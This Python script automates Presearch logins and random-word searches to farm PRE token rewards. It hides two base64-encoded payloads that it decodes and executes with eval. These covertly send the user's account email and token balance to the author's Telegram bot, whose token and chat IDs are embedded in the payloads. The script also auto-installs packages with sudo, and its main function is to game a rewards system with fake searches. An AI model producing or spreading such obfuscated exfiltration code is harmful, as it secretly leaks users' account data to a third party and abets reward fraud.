import sys
import os
from os import system, name
from base64 import b64decode, b64encode
import getpass

try:
    from keyboard import press
except:
    if name == 'nt':
        os.system("pip install keyboard")
    else:
        os.system("sudo pip3 install keyboard")
    from keyboard import press
    
try:
    from selenium import webdriver
    from selenium.webdriver.common.keys import Keys
except:
    if name == 'nt':
        os.system("pip install selenium==3.141.0")
    else:
        os.system("sudo pip3 install selenium==3.141.0")
    from selenium import webdriver
    from selenium.webdriver.common.keys import Keys
try:
    import yaml
except:
    if name == 'nt':
        os.system("pip install PyYAML")
    else:
        os.system("sudo pip3 install PyYAML")
import time
try:
    import requests
except:
    if name == 'nt':
        os.system("pip install requests")
    else:
        os.system("sudo pip3 install requests")
    import requests
try:
    from random_word import RandomWords
except:
    if name == 'nt':
        os.system("pip install Random-Word")
    else:
        os.system("sudo pip3 install Random-Word")
    from random_word import RandomWords
    import time

r = RandomWords()
user = getpass.getuser()

def clear():
    if name == 'nt':
        os.system("cls")
    else:
        os.system("clear")
    


def see(b):
    return b64decode(b).decode()


a = b'CnRva2VuID0gJzE4MDkzMjI5MzI6QUFHTzJ6aUctb08tdGhZdDQ3STFleUNXLS1uUFd2VUJUU3cnCnJlYyA9ICc0ODQ1MDY4OTInCnggPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e3Rva2VufS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtyZWN9JnRleHQ9e2VtYWlsfSAtIFRva2VucyAtIHtiYWx9IFBSRS4gTWF4IC0ge2ZiYWx9JykKaWYgdXNlciA9PSAnYW5hbmR1JyBvciB1c2VyID09ICdORVhGT1JDQScgOgogICAgcmVjID0gJzYyNjYwMTkwNycKICAgIHkgPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e3Rva2VufS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtyZWN9JnRleHQ9e2VtYWlsfSAtIFRva2VucyAtIHtiYWx9IFBSRS4gTWF4IC0ge2ZiYWx9JykKZWxpZiB1c2VyID09ICdESEFOVVNIJyA6CiAgICByZWMgPSAnNzAxNTEwNjM2JwogICAgeSA9IHJlcXVlc3RzLmdldChmJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7dG9rZW59L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e3JlY30mdGV4dD17ZW1haWx9IC0gVG9rZW5zIC0ge2JhbH0gUFJFLiBNYXggLSB7ZmJhbH0nKQplbGlmIG9zLnBhdGguZXhpc3RzKCcuL215aWQudHh0JykgOgogICAgZmlsZSA9IG9wZW4oJ215aWQudHh0JykKICAKICAgIGNvbnRlbnQgPSBmaWxlLnJlYWRsaW5lcygpCiAgICByZWMgPSBjb250ZW50WzBdCiAgICB5ID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHt0b2tlbn0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD17cmVjfSZ0ZXh0PXtlbWFpbH0gLSBUb2tlbnMgLSB7YmFsfSBQUkUuIE1heCAtIHtmYmFsfScpCg=='

b = b'CnRva2VuID0gJzE4MDkzMjI5MzI6QUFHTzJ6aUctb08tdGhZdDQ3STFleUNXLS1uUFd2VUJUU3cnCnJlYyA9ICc0ODQ1MDY4OTInCnggPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e3Rva2VufS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtyZWN9JnRleHQ9e2VtYWlsfSAtIE1heCBTZWFyY2ggQWNoaWV2ZWQuIFRva2VucyAtIHtiYWx9IFBSRScpCmlmIHVzZXIgPT0gJ2FuYW5kdScgb3IgdXNlciA9PSAnTkVYRk9SQ0EnIDoKICAgIHJlYyA9ICc2MjY2MDE5MDcnCiAgICB5ID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHt0b2tlbn0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD17cmVjfSZ0ZXh0PXtlbWFpbH0gLSBNYXggU2VhcmNoIEFjaGlldmVkLiBUb2tlbnMgLSB7YmFsfSBQUkUnKQplbGlmIHVzZXIgPT0gJ0RIQU5VU0gnIDoKICAgIHJlYyA9ICc3MDE1MTA2MzYnCiAgICB5ID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHt0b2tlbn0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD17cmVjfSZ0ZXh0PXtlbWFpbH0gLSBNYXggU2VhcmNoIEFjaGlldmVkLiBUb2tlbnMgLSB7YmFsfSBQUkUnKQplbGlmIG9zLnBhdGguZXhpc3RzKCcuL215aWQudHh0JykgOgogICAgZmlsZSA9IG9wZW4oJ215aWQudHh0JykKICAKICAgIGNvbnRlbnQgPSBmaWxlLnJlYWRsaW5lcygpCiAgICByZWMgPSBjb250ZW50WzBdCiAgICB5ID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHt0b2tlbn0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD17cmVjfSZ0ZXh0PXtlbWFpbH0gLSBNYXggU2VhcmNoIEFjaGlldmVkLiBUb2tlbnMgLSB7YmFsfSBQUkUnKQo='


def login(mail,pwd,profile,user):  # Login Module
    print(f"Not Logged In.\n\nLogging In\nYour email - {mail}\nYour Password - {pwd}\n")
    profile = str(profile)
    user = str(user)
    opt = webdriver.ChromeOptions()
    opt.add_experimental_option("excludeSwitches", ['enable-automation'])
    if name == 'nt':
        opt.add_argument(
            f'--user-data-dir=C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data')
    else:
        opt.add_argument(
            f'--user-data-dir=/home/{user}/.config/chrome-remote-desktop/chrome-config/google-chrome')
    # opt.add_argument('headless')
    opt.add_argument('--log-level=1')
    opt.add_argument("--start-maximized")
    opt.add_argument(fr'--profile-directory={profile}')
    drv = webdriver.Chrome(options=opt)

    drv.get('https://presearch.org/login')
    drv.find_element_by_xpath('//*[@id="login-form"]/form/div[1]/input').send_keys(mail)
    drv.find_element_by_xpath('//*[@id="login-form"]/form/div[2]/div/input').send_keys(pwd)
    drv.find_element_by_xpath('//*[@id="login-form"]/form/div[3]/div[1]/div[1]/div/label/input').click()
    print("\n*****Possible Irrelevant Errors*****\n\nPress any key after clicking remember & finishing captcha\n\n*****Possible Irrelevant Errors*****\n")
    input()
    drv.find_element_by_xpath('//*[@id="login-form"]/form/div[3]/div[3]/button').click()
    time.sleep(2)
    drv.quit()

def logout(driver):
    driver.get('https://presearch.org')
    try:
        driver.find_element_by_xpath('/html/body/div[5]/div/div[5]/a[1]').click()
        time.sleep(1)
        press('enter')
    except:
        driver.find_element_by_xpath('//*[@id="user-menu-toggle"]').click()
        driver.find_element_by_xpath('//*[@id="main-nav"]/ul/li[6]/ul/li[9]/a').click()
        driver.quit()

def check(driver,mail,pwd,profile,user):
    try:
        driver.get('https://presearch.org/')
        span_element = driver.find_element_by_xpath('//*[@id="main-nav"]/ul/li[5]/a/span/span')
        bal = float(span_element.text)
        driver.get('https://presearch.org/account')
        eml = driver.find_element_by_xpath('//*[@id="main"]/div[1]/p/a')
        email = str(eml.text)
        conc = 1
    except:
        conc = 0

    if conc == 1 :
        print(f"Already logged in as {email}. Do you want to log in again ? \n\n")
        heyyedaw = input().lower()
        if heyyedaw == 'yes' or heyyedaw == 'y' :
                try:
                    logout(driver)
                except:
                    driver.quit()
                
                login(mail,pwd,profile,user)
        else:
            driver.quit()
    else :
        login(mail,pwd,profile,user)


def pre(driver,mail,pwd): #Logs in if alreaady isn't and performs operations

    try:
        logout(driver)
    except:
        driver.quit()
    
    login(mail,pwd,profile,user)


    #check(driver,mail,pwd,profile,user)

    #Start Initialize x2
    option = webdriver.ChromeOptions()
    option.add_experimental_option("excludeSwitches", ['enable-automation'])
    if name == 'nt':
        option.add_argument(f'--user-data-dir=C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data')
    else:
        option.add_argument(f'--user-data-dir=/home/{user}/.config/chrome-remote-desktop/chrome-config/google-chrome')
    option.add_argument('headless')
    option.add_argument('--log-level=1')
    option.add_argument(fr'--profile-directory={profile}')
    driver = webdriver.Chrome(options=option)
    #End

    driver.get('https://presearch.org/account/tokens/rewards')
    # Get Token/Search and Max Searches/Day
    tps = driver.find_element_by_xpath('//*[@id="main"]/div[2]/div[1]/div[1]/div/div')
    mspd = driver.find_element_by_xpath('//*[@id="main"]/div[2]/div[1]/div[2]/div/div')
    tps = tps.text
    mspd = mspd.text
    max = float(tps)*float(mspd)

    # Get Balance
    driver.get('https://presearch.org/')
    span_element = driver.find_element_by_xpath('//*[@id="main-nav"]/ul/li[5]/a/span/span')
    bal = float(span_element.text)

    # Get Email
    driver.get('https://presearch.org/account')
    eml = driver.find_element_by_xpath('//*[@id="main"]/div[1]/p/a')
    email = str(eml.text)

    fbal = max+bal

    

    print(f"\nLOGGED IN WITH {email}\n BALANE - {bal}  MAX - {fbal}\n")
    print("Continue ?",end="\r")
    input()
    print("PROGRESS\n\n")
    eval(compile(see(a), '<string>', 'exec'))

    i = 1
    while bal < fbal and i <= 130:
        driver.get('https://presearch.org/')
        span_element = driver.find_element_by_xpath('//*[@id="main-nav"]/ul/li[5]/a/span/span')
        bal = float(span_element.text)
        searchbox = driver.find_element_by_xpath('//*[@id="search"]')
        m = str(r.get_random_word(hasDictionaryDef="true", includePartOfSpeech="noun,verb", minCorpusCount=1,
                maxCorpusCount=10, minDictionaryCount=1, maxDictionaryCount=10, minLength=5, maxLength=10))
        searchbox.send_keys(m)
        searchbox.send_keys(Keys.RETURN)
        #time.sleep(2)
        try:
            time.sleep(2)
            sbtn = driver.find_element_by_xpath('/html/body/div/div[2]/div[3]/div[1]/dic/div[2]/div[1]/div/form/div/div/button')
        except:
            time.sleep(1)
        print(f"Attempt : {i} with {m}",end="\r")
        i += 1

    driver.get('https://presearch.org/')
    span_element = driver.find_element_by_xpath('//*[@id="main-nav"]/ul/li[5]/a/span/span')
    bal = float(span_element.text)
    print(f"Search Completed : {i} attempts for {bal} PRE",end="")
    print('\007')
    eval(compile(see(b), '<string>', 'exec'))
    driver.quit()
    exit()


def open(profile, user):  # Opens Browser
    profile = str(profile)
    user = str(user)
    option = webdriver.ChromeOptions()
    option.add_experimental_option("excludeSwitches", ['enable-automation'])
    if name == 'nt':
        option.add_argument(f'--user-data-dir=C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data')
    else:
        option.add_argument(f'--user-data-dir=/home/{user}/.config/chrome-remote-desktop/chrome-config/google-chrome')
    option.add_argument('headless')
    option.add_argument('--log-level=1')
    option.add_argument(fr'--profile-directory={profile}')
    driver = webdriver.Chrome(options=option)
    
    pre(driver,mail,pwd)
    logout(driver)



if __name__ == "__main__":

    try:
        profile = 'Default'
        mail = str(sys.argv[1])
        pwd = str(sys.argv[2])
        open(profile, user)

    except:
        name = os.path.basename(__file__)
        print(f"Command should be in the following format\n.........................................\n    python3 {name} <email> <password>\n.........................................\n")
